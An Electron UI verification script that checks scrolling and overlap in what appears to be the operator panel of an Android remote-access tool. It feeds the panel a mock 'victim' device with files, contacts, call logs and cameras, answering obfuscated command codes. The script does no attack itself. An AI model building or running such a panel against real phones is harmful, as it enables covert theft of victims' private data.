/* verify-fixed.js —— 修复后最终验收：真实渲染修复后的 lab.html + 各视图
 * 检查项：
 *   1. #parent 内部可滚动（文件列表在自己的框里滚，不再溢出页面）
 *   2. 文档不再整体滚动（docSH == docCH）
 *   3. 底部终端与内容区零重叠；可见的文件条目没有被任何东西盖住
 *   4. 终端面板自身可滚动、且固定占满窗口底部 20% 带
 *   5. 其他视图（通讯录/通话记录/相机）同样正常
 */
const { app, BrowserWindow } = require('electron');
const fs = require('fs');
const path = require('path');

const APP_DIR = process.env.LAB_APP_DIR || 'F:/piupiupiu/piupiupiu-Server/app';
const OUT = process.env.UI_CHECK_OUT || 'F:/piupiupiu/tools/ui-check/shots';
fs.mkdirSync(OUT, { recursive: true });
const FLOWS = [];
const log = (s) => FLOWS.push(s);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function makeFakeVictim(id) {
  var handlers = {};
  var B = '/storage/emulated/0';
  var files = [
    { name: 'Alarms', isDir: true }, { name: 'Android', isDir: true },
    { name: 'DCIM', isDir: true }, { name: 'Documents', isDir: true },
    { name: 'Download', isDir: true }, { name: 'Movies', isDir: true },
    { name: 'Music', isDir: true }, { name: 'Notifications', isDir: true },
    { name: 'Pictures', isDir: true }, { name: 'Podcasts', isDir: true },
    { name: 'Recordings', isDir: true }, { name: 'Ringtones', isDir: true },
    { name: 'WhatsApp', isDir: true }, { name: 'backups', isDir: true },
    { name: '.nomedia', isDir: false },
    { name: 'IMG_20251031_201205.jpg', isDir: false },
    { name: 'IMG_20251031_201233.jpg', isDir: false },
    { name: 'IMG_20251102_091012.jpg', isDir: false },
    { name: 'Screenshot_20251104-135122.png', isDir: false },
    { name: 'VID_20251108_183012.mp4', isDir: false },
    { name: 'download.pdf', isDir: false },
    { name: 'logcat_export.txt', isDir: false },
    { name: 'voice_1124.m4a', isDir: false },
  ].map((f) => ({ name: f.name, isDir: f.isDir, fp: B + '/' + f.name }));
  var contacts = [];
  for (var i = 1; i <= 40; i++) contacts.push({ name: '联系人 ' + i, phoneNo: '+86 138' + (10000000 + i) });

  var api = {
    id: id,
    emit: function (type, payload) {
      var frameType = type, body = payload;
      if (payload && typeof payload === 'object' && payload.order) {
        frameType = payload.order; body = {};
        for (var k in payload) if (k !== 'order' && Object.prototype.hasOwnProperty.call(payload, k)) body[k] = payload[k];
      }
      log('emit -> ' + JSON.stringify({ t: frameType, x: body }).slice(0, 160));
      var self = api;
      var deliver = function (t, p) { setTimeout(function () { self._deliver(t, p); }, 60); };
      if (frameType === 'm3b8tz' && body.op === 'ls') deliver('m3b8tz', files);
      if (frameType === 'n5j1pr') deliver('n5j1pr', { contactsList: contacts });
      if (frameType === 'c2h6vn') deliver('c2h6vn', { callsList: contacts.slice(0, 30).map(function (c, i) {
        return { phoneNo: c.phoneNo, name: c.name, duration: String(i * 13 + 5), type: i % 2 }; }) });
      if (frameType === 'k7f2qa' && body.op === 'cv') deliver('k7f2qa', { cv: true, list: [{ name: 'Front', id: 1 }, { name: 'Back', id: 2 }] });
    },
    on: function (type, cb) { if (!handlers[type]) handlers[type] = []; handlers[type].push(cb); },
    removeAllListeners: function (type) { if (type) delete handlers[type]; else handlers = {}; },
    _deliver: function (type, payload) {
      var arr = handlers[type]; if (!arr) return;
      for (var i = 0; i < arr.length; i++) { try { arr[i](payload); } catch (e) { log('handler err: ' + e.message); } }
    },
    _touch: function () {}, _idle: function () { return false; }, _pop: function () { return null; },
  };
  return api;
}

const MEASURE = `
(() => {
  const toR = (b) => b ? { x:+b.x.toFixed(1), y:+b.y.toFixed(1), w:+b.width.toFixed(1), h:+b.height.toFixed(1), bottom:+b.bottom.toFixed(1) } : null;
  const R = (sel) => { const e = document.querySelector(sel); return e ? toR(e.getBoundingClientRect()) : null; };
  const parent = document.querySelector('#parent');
  const logy = document.querySelector('#logy');
  const out = { viewport: { w: innerWidth, h: innerHeight }, ngViewRect: R('[ng-view]'), parentRect: R('#parent'), logyRect: R('#logy') };

  // 只检查「在滚动容器可见范围内」的条目是否被盖住（裁剪在滚动区外的条目跳过）
  const covered = [];
  if (parent) {
    const pr = parent.getBoundingClientRect();
    const items = parent.querySelectorAll('.item, tbody tr');
    let i = 0;
    for (const it of items) {
      const b = it.getBoundingClientRect();
      const x1 = Math.max(b.left, pr.left), x2 = Math.min(b.right, pr.right);
      const y1 = Math.max(b.top, pr.top), y2 = Math.min(b.bottom, pr.bottom);
      if (x2 - x1 <= 2 || y2 - y1 <= 2) { i++; continue; }         // 完全在滚动区外
      const cx = (x1 + x2) / 2, cy = (y1 + y2) / 2;
      if (cx < 1 || cy < 1 || cx > innerWidth - 1 || cy > innerHeight - 1) { i++; continue; }
      const top = document.elementFromPoint(cx, cy);
      if (!(it.contains(top) || top === it)) {
        covered.push({ i, text: it.textContent.trim().replace(/\\s+/g,' ').slice(0, 26),
          by: top ? (top.id || String(top.className).slice(0, 34)) : 'null',
          byLogy: !!(top && (top === logy || logy.contains(top))) });
      }
      i++;
    }
  }
  out.covered = covered;

  out.scroll = {
    docSH: document.documentElement.scrollHeight, docCH: document.documentElement.clientHeight,
    parent: parent ? { sh: parent.scrollHeight, ch: parent.clientHeight, canScroll: parent.scrollHeight > parent.clientHeight + 1, st: parent.scrollTop } : null,
    logy: logy ? { sh: logy.scrollHeight, ch: logy.clientHeight, canScroll: logy.scrollHeight > logy.clientHeight + 1, st: logy.scrollTop } : null,
  };
  if (parent && logy) {
    const pr = parent.getBoundingClientRect(), lr = logy.getBoundingClientRect();
    out.parentLogyOverlap = +Math.max(0, Math.min(pr.bottom, lr.bottom) - Math.max(pr.top, lr.top)).toFixed(1);
  }
  return out;
})()
`;

async function main() {
  app.disableHardwareAcceleration();
  await app.whenReady();
  const child = new BrowserWindow({ width: 600, height: 650, darkTheme: true, transparent: true, resizable: false, frame: false, show: false, webPreferences: { nodeIntegration: true } });
  child.webContents.victim = makeFakeVictim('verify-device');
  child.once('ready-to-show', () => child.show());

  const report = {};
  const shot = async (name) => { const img = await child.webContents.capturePage(); fs.writeFileSync(path.join(OUT, name), img.toPNG()); log('shot ' + name); };
  const clickMenu = (re) => child.webContents.executeJavaScript(`(()=>{const it=[...document.querySelectorAll('.ui.menu .item')].find(e=>(${re}).test(e.textContent)); it&&it.click(); return !!it;})()`);

  await child.loadURL('file:///' + APP_DIR + '/app/lab.html');
  await sleep(1000);

  // ---- 1) File Manager ----
  await clickMenu('/File Manager/i');
  await sleep(1500);
  report.fileManager_initial = await child.webContents.executeJavaScript(MEASURE);
  await shot('verify-fm-initial.png');

  // 滚到列表底部
  await child.webContents.executeJavaScript(`(()=>{const p=document.querySelector('#parent');p.scrollTop=p.scrollHeight;return p.scrollTop;})()`);
  await sleep(350);
  report.fileManager_scrolledBottom = await child.webContents.executeJavaScript(MEASURE);
  await shot('verify-fm-scrolled-bottom.png');

  // 终端塞满日志后自身应可滚动、几何不变
  await child.webContents.executeJavaScript(`
    (() => { const l = document.querySelector('#logy');
      for (let i = 0; i < 60; i++) { const d = document.createElement('div'); d.className='log';
        d.innerHTML = '<div class="w30" style="display:inline-block">2026/10/14 08:00:00</div><div class="w65" style="display:inline-block">log line ' + i + '</div>';
        l.appendChild(d); }
      l.scrollTop = l.scrollHeight; return true; })()`);
  await sleep(350);
  report.fileManager_logsFull = await child.webContents.executeJavaScript(MEASURE);
  await shot('verify-fm-logs-full.png');

  // ---- 2) Contacts ----
  await clickMenu('/contacts/i');
  await sleep(1500);
  report.contacts = await child.webContents.executeJavaScript(MEASURE);
  await shot('verify-contacts.png');

  // ---- 3) Calls Logs ----
  await clickMenu('/Calls Logs/i');
  await sleep(1500);
  report.callsLogs = await child.webContents.executeJavaScript(MEASURE);
  await shot('verify-calls.png');

  // ---- 4) Camera ----
  await clickMenu('/Camera/i');
  await sleep(1500);
  report.camera = await child.webContents.executeJavaScript(MEASURE);
  await shot('verify-camera.png');

  // 回到 File Manager 确认一遍
  await clickMenu('/File Manager/i');
  await sleep(1400);
  report.fileManager_again = await child.webContents.executeJavaScript(MEASURE);
  await shot('verify-fm-again.png');

  fs.writeFileSync(path.join(OUT, 'verify-report.json'), JSON.stringify(report, null, 2));
  fs.writeFileSync(path.join(OUT, 'flows-verify.log'), FLOWS.join('\n'));
  app.exit(0);
}

const guard = setTimeout(() => { log('超时'); fs.writeFileSync(path.join(OUT, 'flows-verify.log'), FLOWS.join('\n')); app.exit(2); }, 45000);
main().catch((e) => { log('失败: ' + (e && e.stack || e)); clearTimeout(guard); fs.writeFileSync(path.join(OUT, 'flows-verify.log'), FLOWS.join('\n')); app.exit(1); });
